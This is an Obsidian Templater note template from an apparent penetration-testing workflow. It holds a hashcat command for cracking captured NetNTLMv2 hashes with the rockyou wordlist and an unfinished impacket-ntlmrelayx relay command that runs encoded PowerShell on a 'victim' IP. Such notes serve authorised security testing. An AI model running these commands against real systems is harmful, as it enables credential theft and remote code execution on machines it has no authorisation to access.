<%*
let File = await tp.system.prompt("Enter NTLM2 File name")
-%>

- Cracking with  #Hascat NTLM2  <% File %>.hash  :

```
hashcat -m 5600 <% File %>.hash /usr/share/wordlists/rockyou.txt --force
```

> [!Warning] If not found 
> If no password was found, Try NTLM2 Relay or more information or rules are missing.
> ```
>  impacket-ntlmrelayx --no-http-server -smb2support -t  <% tp.frontmatter["IPVictima"] %> -c "powershell -enc   
> ```


